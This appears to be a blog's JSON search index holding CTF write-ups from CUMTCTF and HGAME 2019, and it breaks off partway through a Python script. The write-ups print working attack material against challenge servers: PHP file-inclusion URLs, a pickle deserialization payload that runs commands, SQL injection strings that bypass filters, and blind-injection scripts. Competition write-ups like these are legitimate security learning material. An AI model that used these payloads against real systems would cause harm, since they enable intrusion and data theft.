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","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"Rootme网站做题记录(一)","slug":"rootme","date":"2019-07-31T09:45:39.000Z","updated":"2020-09-13T14:45:11.755Z","comments":true,"path":"2019/07/31/rootme/","link":"","permalink":"http://chaosec.top/2019/07/31/rootme/","excerpt":"The article has been encrypted, please enter your password to view.","text":"官方不建议公布wp，所以加密。可以email交流 Incorrect Password! No content to display! ","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"CUMTCTF第三轮月赛与决赛","slug":"cumtctf3","date":"2019-05-22T08:36:44.000Z","updated":"2020-01-05T13:03:46.155Z","comments":true,"path":"2019/05/22/cumtctf3/","link":"","permalink":"http://chaosec.top/2019/05/22/cumtctf3/","excerpt":"第三次双月赛题解","text":"第三次双月赛题解 Crypto 古典密码签到 维吉尼亚密码，密文juttaigykhpmjyreca，秘钥cumt，在线解密即可https://www.qqxiuzi.cn/bianma/weijiniyamima.php flag: flag{hahayoufindtheflag} encode 题目给出的pyc文件，在线反编译一下即可得到源代码 很简单的解密题，按照相反的逻辑解密即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env python# encoding: utf-8import base64def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return sdef encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return sdef encode3(ans): return base64.b32encode(ans)flag = ' 'final = 'LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E==='# if encode3(encode2(encode1(flag))) == final:# print 'correct'# else:# print 'wrong'def decode3(ans): return base64.b32decode(ans)def decode2(ans): s = '' for i in ans: x = ord(i) x = x ^ 36 x = x - 36 s += chr(x) return sdef decode1(ans): s = '' for i in ans: x = ord(i) x = x - 25 x = x ^ 36 s += chr(x) return s print decode1(decode2(decode3(final))) 1flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125; web web签到1 简单的文件包含即可 1http:&#x2F;&#x2F;202.119.201.199:30100&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;cxk.php flag{CumtCTF_this_iS_a_RElLy_fLaG!!!} Web签到2 12345678910111213141516171819202122232425262728293031class P &#123; private $var; function __invoke()&#123; eval( 'global '.$this -&gt; var.';'. '$ret = '.$this -&gt; var.';' ); return $ret; &#125;&#125;class K &#123; protected $fn; public $name; function __toString()&#123; echo 'string'; $fn = $this -&gt; fn; return $fn(); &#125;&#125;class U &#123; public $obj; function __wakeup()&#123; if (!isset($this-&gt;obj-&gt;name) || $this-&gt;obj-&gt;name != \"iv4n\") &#123; $this -&gt; obj -&gt; fn = function()&#123;&#125;; &#125; &#125;&#125;echo unserialize($_POST['obj'])-&gt;obj; flag{0k_y0u_4lr3ady_kn0w_uns3ria1ize} Baby Flask flask项目的网站，查看源代码可以看到github网址，给出了网站源码， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)# add secret key to enable session# and this is a fake secret key, just an exampleapp.config['SECRET_KEY'] = 'you_find_secret_key_congratulations'User = type('User', (object,), &#123; 'uname': 'test', 'is_admin': 0, '__repr__': lambda o: o.uname,&#125;)@app.route('/', methods=('GET',))def index_handler(): if not session.get('u'): u = pickle.dumps(User()) session['u'] = u return render_template('index.html')@app.route('/file', methods=('GET',))def file_handler(): path = request.args.get('file') path = os.path.join('static', path) if not os.path.exists(path) or os.path.isdir(path) \\ or '.py' in path or '.sh' in path or '..' in path: return 'disallowed' with open(path, 'r') as fp: content = fp.read() return content@app.route('/admin', methods=('GET',))def admin_handler(): try: u = session.get('u') print(pickle.loads(b'\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.')) if isinstance(u, dict): u = b64decode(u.get('b')) u = pickle.loads(u) if u.is_admin == 1: return 'welcome, admin' else: return 'who are you?' except Exception: return 'uhh?' if __name__ == '__main__': app.run('0.0.0.0', port=80, debug=False) 可以看到file路由处可以进行文件读取 查看历史提交记录可以看到某个版本中有如下语句 1app.config['SECRET_KEY'] = os.getenv('secret_key') 可以看到环境变量中写入了秘钥值，结合上面的文件读取漏洞，我们可以读取到该秘钥值，也可以知道用户是iv4n 读取到秘钥就可以伪造session了，查看admin的代码可以知到此处利用了pickle模块，该模块可以进行序列化操作，而且也存在反序列化漏洞，可以利用reduce方法来进行命令执行 12345678910111213import base64import pickleimport osclass User(object): def __reduce__(self): a = \"`ls / -l &gt; /home/iv4n/3.txt`\" return (os.system,(a,))u = pickle.dumps(User())print(u)bu = base64.b64encode(u)print(bu) 这里坑的地方在于，当时我发现这个命令执行漏洞没有回显，所以我先尝试了反弹shell，结果bash反弹失败了，此处我尝试了将命令执行的结果写入文件中，然后读取文件即可，此处需要注意的是写入文件是有权限限制的，起初我想在根目录或者项目目录中写入文件，但是都失败了，估计是权限不够，必须找一个有权限的目录才行，我们前面已经知道了项目用户是iv4n，那么我们直接写入该用户的目录下不就行了，用上面的命令输出值之后进行session伪造即可（使用base64是为了防止编码问题） 1py flask_session_cookie_manager3.py encode -s you_find_secret_key_congratulations -t &#123;&#39;u&#39;:&#123;&#39;b&#39;:b&#39;gANjcG9zaXgKc3lzdGVtCnEAWD0AAABgY2F0IC9mMWxsMWxsMTQ0NGFhYWcvZjFsbDFsbDE0NDRhYWFnID4gL2hvbWUvaXY0di9ndWVzcy50eHRgcQGFcQJScQMu&#39;&#125;&#125; 然后修改cookie，刷新admin页面，然后去读文件 可以看到flag文件，直接读取即可 PS：反弹shell失败的原因在于我使用的是bash反弹shell，而题目环境中没有bash而是sh，而且也没有/dev/tcp文件，可以通过fork子进程来进行反弹shell 我走的一个弯路在于一直想以admin身份登录（虽然登录之后毛都没有），但是一直报错，记录一下自己的方法 pickle模块在序列化类的时候，是不会序列化具体值的，我们解密cookie的值为 1&#123;&#39;u&#39;:b&#39;\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.&#39;&#125; 可以看到并没有包含User的具体字段的信息，换句话说我们即使本地修改了is_admin的值，在服务器端反序列化之后也并没有被记录，而是直接以代码中的定义来初始化，也就是 12345User = type('User', (object,), &#123; 'uname': 'test', 'is_admin': 0, '__repr__': lambda o: o.uname,&#125;) is_admin又被初始化为0了，所以我们无法登陆成功，那么怎么解决这个问题呢？ 我们可以通过将is_admin设置为类属性来解决 1234567891011import pickleimport base64class User(object): def __init__(self): self.a = 2 self.is_admin = 1a=User()c=pickle.dumps(a)print(c)print(base64.b64encode(c))pickle.loads(c) 1b&#39;\\x80\\x03c__main__\\nUser\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.&#39; 可以看到is_admin被序列化了（个人理解是dump方法会序列化类的属性），然后需要注意一点，上面的输出包含__mian__，和我们从网站解密的对比一下 b’\\x80\\x03cprogram_main_app@@@\\nUser\\nq\\x00)\\x81q\\x01.’ 同样位置是program_main_app@@@，这应该是模块名，如果不对应的化反序列化会失败，此处我们也需要进行相应的修改，最终如下 1b&#39;\\x80\\x03cprogram_main_app@@@\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03K\\x02X\\x08\\x00\\x00\\x00is_adminq\\x04K\\x01ub.&#39; CUMTCTF_FINAL_2019 MISC 委屈的兔兔 打开图片，查看16进制即可在尾部看到unicode编码，解码即可得到flag key{you are right} 两岁半的猪 拖进stegsolve就会简单移位就可以看到二维码 flag{AppLeU0} 寻找你的key zip伪加密，之后是一个exe文件，拖进16进制查看发现是反向的base64图片编码，在线解码即可得到二维码，扫描可得flag KEY{dca57f966e4e4e31fd5b15417da63269} 302 抓包去掉referer头可以看到base64编码图片，解码得到图片，然后还可以看到有个key字段，值为123.com，然后用key值在线解密网站解密即可 1http:&#x2F;&#x2F;www.atool9.com&#x2F;steganography.php flag{85bb86974a2a33bd4032ea3b7264b831} WEB 签到题 md5弱比较 1234567$s = sanitize_user_input($_GET['s']); $h = secured_hash_function($_GET['h']); $r = gen_secured_random(); if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) &#123; print \"Well done! Here is your flag: \".$flag; &#125; 因为是将$s放在前面而且允许输入数字，那我们就可以利用MD5弱比较来进行绕过，右边生成一个0e开头的纯数字md5，左边直接输入0e与后面数字拼接即可验证通过 SQL注入 测试列数，发现过滤，双写可以绕过 1http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;1&#39; oorrder by 4-- + 测试一下过滤，发现只过滤union，select，or，然后开始正常联合注入 数据库名ctf 爆表名123http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()-- +ctf,f1ag1nit爆列名 123http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name&#x3D;&#39;f1ag1nit&#39;-- +id,flag 爆flag时发现flag被过滤了，现在需要在不输入列名的情况下得到数据，百度搜索到一个方法 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_35078631&#x2F;article&#x2F;details&#x2F;78589926 不过例子中的左右都是三列，使用union没有问题，而本题中f1ag1nit中只有两个字段，如果直接使用联合注入的话会因为列数不相等报错，所以我们需要给它认为加上一列，payload如下： 1http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; uniunionon seselectlect * from (seselectlect 1)a,(seselectlect 2)b,(seselectlect 3)c ununionion seselectlect * from f1ag1nit a,(selselectect 2) b limit 1,2-- + 1flag&#123;3eaba49ada2ec0aa44ceaa7beee35401&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"HGAME2019-Web-Week3&4","slug":"hgame2019b","date":"2019-03-02T07:55:12.000Z","updated":"2019-03-17T13:09:45.519Z","comments":true,"path":"2019/03/02/hgame2019b/","link":"","permalink":"http://chaosec.top/2019/03/02/hgame2019b/","excerpt":"week-3","text":"week-3 神奇的MD5 文件探测一下发现存在备份文件泄露.login.php.swp，核心代码如下1234567891011121314151617181920&lt;?phpsession_start();error_reporting(0);if (@$_POST['username'] and @$_POST['password'] and @$_POST['code'])&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; $code = (string)$_POST['code']; if (($username == $password ) or ($username == $code) or ($password == $code)) &#123; echo \"Your input can't be the same\"; &#125; else if ((md5($username) === md5($password)) and (md5($password) === md5($code)))&#123; echo \"Good\"; header('Location: admin.php'); exit(); &#125; else &#123; echo \"&lt;pre&gt; Invalid password&lt;/pre&gt;\"; &#125;&#125; 可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章link，有一个工具fastcoll就可以生成两个MD5值相同的不同文件 先生成两个MD5值相同的文件1fastcoll_v1.0.0.5.exe -o test0 test1 然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同1fastcoll_v1.0.0.5.exe -p test1 -o test00 test01 将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test0112tail -c 128 test00 &gt; atail -c 128 test01 &gt; b 执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test1112type test0 a &gt; test10type test1 b &gt; test11 于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下 1curl --data-urlencode username@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test00 --data-urlencode password@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test01 --data-urlencode code@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test10 http:&#x2F;&#x2F;118.25.89.91:8080&#x2F;question&#x2F;login.php -i 之后可以得到服务器返回的cookieSet-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下1$cmd = str_replace(\"flag\",'none',$cmd);绕过很简单，通配符与单引号都可以绕过 payload：cat /fl?? OR cat /fl&#39;&#39;ag flag：hgame{a1c83b66cc504d583c09ea6c20c0dabc} sqli-1 1substr(md5($_GET[\"code\"]),0,4) === 7229 题目需要验证码，可以爆破一下 123456for($i=0;$i&lt;999999999;$i++)&#123; if(substr(md5($i), 0, 4)==='803a')&#123; echo $i; break; &#125;&#125; 然后就是常规的数字型注入了，注意每次都要更新一下code值 1?code&#x3D;4446&amp;id&#x3D;1 order by 1--+ 1?code&#x3D;31226&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+ f1l1l1l1g,words 不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下 1?code&#x3D;70176&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x66316c316c316c3167--+ f14444444g 1?code&#x3D;51097&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g--+ flag: hgame{sql1_1s_iNterest1ng} sqli-2 依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。 PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了 123456789101112131415161718192021222324252627282930313233343536import hashlibimport requestsimport reimport stringcookies = &#123;'PHPSESSID':'lseqgohjo9eibfivnemk6sa8vd'&#125;def md5(_in): m = hashlib.md5() m.update(_in.encode('utf-8')) return m.hexdigest()[0:4]def get_code(): global url res = requests.get(url, cookies=cookies).text code = re.findall(r'=== (.&#123;4&#125;)&lt;br&gt;',res)[0] for i in range(9999999999999): if code == md5(str(i)): return str(i)url = \"http://118.89.111.179:3001/\"output = \"hgame&#123;sqli_1s_s0_\"succ = \"sql error\"name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + '_&#123;&#125;' + ','for i in range(18,60): for j in name_dic: code = get_code() # payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)=\"&#123;str(j)&#125;\"),0,sleep(5))--+' # F11111114G,WORDS # payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name=\"F11111114G\"),&#123;str(i)&#125;,1)=\"&#123;str(j)&#125;\"),0,sleep(5))--+' # FL4444AG payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select FL4444AG from F11111114G),&#123;str(i)&#125;,1)=binary \"&#123;str(j)&#125;\"),sleep(-5),1)--+' res = requests.get(url+payload,cookies=cookies).text if succ in res: output += j print(\"output: \",output) break flag如下 1hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125; 基础渗透 正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有action=message，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含 1http:&#x2F;&#x2F;111.231.140.29:10080&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index 得到源码12345678910&lt;?phpinclude_once(\"template/header.php\");if (is_null($_SESSION['user_id'])) &#123; header('Location:/login.php'); exit();&#125;$page = array_key_exists('action', $_GET) ? $_GET['action'] : 'message';require $page .'.php';include_once(\"template/footer.php\");?&gt; functions.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208&lt;?php//ini_set(\"display_errors\", \"on\");require_once('config.php');session_start();function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function csrf_token()&#123; $token = ''; $chars = str_split('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'); for ($i = 0; $i &lt; 48; $i++) &#123; $token = $token . $chars[random_int(0, 61)]; &#125; $_SESSION['token'] = $token; echo \"&lt;input type='hidden' value='$token' id='token'&gt;\";&#125;function res_to_json($res, $type)&#123; $json['type'] = $type; $json['status'] = \"true\"; $json[\"content\"] = array(); foreach ($res as $message) &#123; $array_tmp['user_id'] = $message['user_id']; $array_tmp['user'] = $message['user']; $array_tmp['avatar'] = get_avatar($message['user_id']) != null ? get_avatar($message['user_id'])['content'] : md5($message['user']); $array_tmp['message'] = $message['content']; $array_tmp['message_id'] = $message['message_id']; $array_tmp['time'] = $message['date']; array_push($json[\"content\"], $array_tmp); &#125; $json[\"content\"] = $json[\"content\"]; return json_encode($json);&#125;function judge($username, $password)&#123; if ($username == null) &#123; echo \"username's length error!\"; return false; &#125; elseif (strlen($password) &lt; 6 or strlen($password) &gt; 16) &#123; echo \"password's length error!\"; return false; &#125; else &#123; return true; &#125;&#125;function register($username, $password, $token)&#123; if (judge($username, $password) == 1 and $token === $_SESSION['token']) &#123; $password = md5($password); $sql_query = \"insert into `users`(`username`,`password`) VALUES ('$username','$password')\"; $res = sql_query($sql_query); if ($res) &#123; echo 'register success!'; &#125; else &#123; echo 'error!'; &#125; &#125; else &#123; echo \"error!\"; return false; &#125;&#125;function login($username, $password, $token)&#123; if (!isset($_SESSION['login']) and $token === $_SESSION['token']) &#123; $password = md5($password); $sql_query = \"select * from `users` where `username`='$username' and `password`='$password'\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION['user_id'] = $data['user_id']; $_SESSION['user'] = $data['username']; $_SESSION['groups'] = $data['groups']; $_SESSION['login'] = 1; setcookie('user', $_SESSION['user']); setcookie('groups', $_SESSION['groups']); &#125; else &#123; echo \"error!\"; return false; &#125; &#125; else &#123; echo \"error!\"; return false; &#125;&#125;function loginout()&#123; if ($_GET['loginout'] === $_SESSION['token']) &#123; session_destroy(); setcookie('groups', null); setcookie('user', null); Header(\"Location: index.php\"); &#125;&#125;function get_avatar($user_id)&#123; $sql_query = \"select `avatar` from `users` where `user_id`=$user_id\"; $res = sql_query($sql_query)-&gt;fetch_row()[0]; if ($res) &#123; return array('name' =&gt; $res, 'content' =&gt; base64_encode(file_get_contents('./img/avatar/' . $res . '.png'))); &#125; else &#123; return null; &#125;&#125;function get_new_messages()&#123; $start = $_GET['start'] ?? 0; $start = addslashes($start); $user_id = $_SESSION['user_id']; $sql_query = \"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; return res_to_json($res, \"messages\"); &#125;&#125;function get_messages()&#123; $start = $_GET['start'] ?? 0; $start = addslashes($start); $user_id = $_SESSION['user_id']; $sql_query = \"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; return res_to_json($res, \"messages\"); &#125;&#125;function add_message($message)&#123; if ($_POST['token'] === $_SESSION['token']) &#123; if (isset($_SESSION['login']) and mb_strlen($message) &gt; 6) &#123; $user_id = $_SESSION['user_id']; $user = $_SESSION['user']; $sql_query = \"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')\"; sql_query($sql_query); &#125; elseif (!isset($_SESSION['login'])) &#123; echo \"login error\"; &#125; else &#123; echo \"length error\"; &#125; &#125;&#125;function delete_message($message_id)&#123; $user_id = $_SESSION['user_id']; if ($_POST['token'] === $_SESSION['token']) &#123; if ($_SESSION['groups'] == 0) &#123; $sql_query = \"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\"; &#125; elseif ($_SESSION['groups'] == 1) &#123; $sql_query = \"delete from `messages` where `message_id`=$message_id\"; &#125; sql_query($sql_query); &#125;&#125;function rand_filename()&#123; $tmp = `cat /dev/urandom | head -n 10 | md5sum | head -c 15`; $sql_query = \"select `avatar` from `users` where `avatar`=$tmp\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; return rand_filename(); &#125; else &#123; return $tmp; &#125;&#125;function upload_avatar()&#123; $type = $_FILES['file']['type']; $user_id = $_SESSION['user_id']; if ($type == 'image/gif' || $type == 'image/jpeg' || $type == 'image/png') &#123; $avatar = get_avatar($user_id); if ($avatar == null) &#123; $name = rand_filename(); move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $name . \".png\"); $sql_query = \"update `users` set `avatar`='$name' WHERE `user_id`=$user_id\"; sql_query($sql_query); &#125; else &#123; move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $avatar['name'] . \".png\"); &#125; &#125;&#125;function change_password($opassword, $npassword, $npasswod_again)&#123; if (judge($_SESSION['user'], $npassword)) &#123; if ($npasswod_again !== $npassword) &#123; echo \"difference error\"; &#125; else &#123; $user_id = $_SESSION['user_id']; $sql_query = \"select `password` from `users` where `user_id`=$user_id\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) &#123; if ($res-&gt;fetch_row()[0] === md5($opassword)) &#123; $sql_query = \"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id\"; $res = sql_query($sql_query); echo $res; echo \"successful\"; &#125; else &#123; echo \"oldpassword error\"; &#125; &#125; &#125; &#125;&#125; 审计代码可知，存在一处图片上传，但是不知道文件名，题目中有很多sql语句，都用addslashes()函数转义过了，字符型注入无法实施，但是在delete_message中存在数字型注入$sql_query = “delete from messages where message_id=$message_id and user_id=$user_id”;，参数可控且没有单引号（addslashes()过滤无效），我们可以通过时间盲注来获取我们当前用户对应的文件名，token是一次一刷新，需要每次都获取，代码如下1234567891011121314151617181920212223import requestsimport recookies = &#123; \"groups\":\"0\", \"PHPSESSID\":\"c419fq3ppu11r1o2tra4l9rlnm\", \"user\":\"snowtest\"&#125;url_del = 'http://111.231.140.29:10080/messages_api.php?action=delete'url = 'http://111.231.140.29:10080/index.php?action=message'message = \"7469 and if(ascii((substr((select avatar from users where username like 0x736e6f777425 limit 1),&#123;&#125;,1)))=&#123;&#125;,sleep(5),0)#\"avatar = ''for i in range(1,100): for j in range(34,127): r = requests.get(url,cookies=cookies) token = re.findall(r\"value='(.*)' id='token'&gt;\",r.text)[0] data = dict(token=token,message_id=message.format(i,j)) try: r = 